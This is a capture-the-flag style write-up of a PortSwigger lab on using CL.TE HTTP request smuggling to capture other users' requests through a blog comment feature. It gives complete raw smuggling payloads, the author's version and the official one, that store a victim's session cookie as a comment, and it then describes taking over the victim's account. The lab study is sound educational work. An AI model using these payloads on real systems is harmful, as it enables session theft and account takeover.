# Exploiting HTTP request smuggling to capture other users' requests

**Category:** HTTP Request Smuggling
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests

Every lab up to this point has smuggled a request we already knew the shape of. This one flips the objective: instead of forging a request, we set a trap and let a real victim's browser fill in the details for us — including their session cookie, which is the whole point.

## The Target

The application is a blog with a comment feature. Comments are stored server-side and displayed back on the post page, which makes the comment body a storage primitive we can abuse: anything that ends up inside a comment gets served back to us on a later page load, no additional access required.

## The Investigation

The idea is to smuggle an incomplete `POST /post/comment` request with a `Content-Length` deliberately set far larger than the actual comment body we supply. The back-end, expecting that many more bytes before the request is complete, keeps consuming data from the connection — which means the *next* real request that lands on that same back-end connection, whoever sent it, gets absorbed byte-for-byte into our comment's body instead of being processed as its own request. If a real visitor's browser happens to send their next request down that same poisoned connection, their raw request — headers, cookies, and all — ends up stored as a comment we can simply read.

We positioned the `comment` parameter last in the body so that whatever gets appended from the victim's request lands inside it, and oversized the `Content-Length` to leave room to capture as much of a follow-up request as possible:

```
POST /post/comment HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=ATTACKER_SESSION

csrf=CSRF_TOKEN&postId=2&name=test&email=test%40test.net&website=https%3A%2F%2Ftest.net&comment=
```

## The Exploit

We smuggled this comment-post request via CL.TE with an oversized `Content-Length`, then waited and repeatedly checked the blog post's comment section for a comment containing a `Cookie:` header that wasn't our own:

```
GET / HTTP/1.1
Host: TARGET
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=ATTACKER_SESSION

csrf=CSRF_TOKEN&postId=2&name=test&email=test%40test.net&website=https%3A%2F%2Ftest.net&comment=
```

Because the lab's simulated victim only browses intermittently, this isn't a one-shot attack — the outer request has to sit poisoning the queue until the victim's browser happens to send its next request down the same connection. Once a comment did contain a stored `Cookie` header with a different session value, we copied it and used it directly to load `/my-account`, confirming access to the victim's own account.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution is the same mechanism with the numbers filled in from a live Repeater session:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=your-session-token

csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
```

This matches our technique exactly — same oversized `Content-Length: 400` on the smuggled comment-post, same trailing `comment=` parameter to absorb the follow-up request, same wait-and-repeat pattern because the victim browses only intermittently. Their solution also flags a real edge case we ran into as well: if the captured comment is incomplete and cuts off before the victim's `Cookie` header, the fix is to slowly increase the inner `Content-Length` until the whole cookie is captured — which is exactly the kind of iterative tuning a script can automate by resending with progressively larger values rather than manually recalculating and re-sending in Repeater each time.

## What This Teaches Us

This lab is the point where request smuggling stops being about forging requests we already know the contents of and starts being about intercepting requests we don't control at all — the victim's session cookie, in the clear, landing in a place we're allowed to read. It's a sharp illustration of why session cookies alone are a weak boundary once request smuggling is on the table: nothing about the cookie itself was compromised, the *transport* was, and any storage feature that echoes user-supplied content back out (comments, support tickets, search history) becomes a viable exfiltration channel the moment an attacker can poison what lands inside it.
